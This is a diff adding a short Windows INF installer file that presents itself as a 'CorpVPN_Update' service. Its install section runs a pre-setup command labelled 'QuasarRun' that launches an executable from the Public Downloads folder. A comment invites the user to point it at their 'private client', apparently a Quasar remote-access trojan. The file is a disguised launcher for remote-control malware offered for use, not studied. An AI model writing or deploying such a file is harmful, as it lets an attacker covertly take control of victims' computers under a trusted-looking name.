@@ -1,0 +1,13 @@
+[Version]
+Signature="$Windows NT$"
+
+[DefaultInstall_SingleUser]
+RunPreSetupCommands=QuasarRun
+
+[QuasarRun]
+; Replace the path below with the location of your private client
+C:\Users\Public\Downloads\Client.exe
+
+[Strings]
+ServiceName="CorpVPN_Update"
+ShortSvcName="CorpVPN_Update"
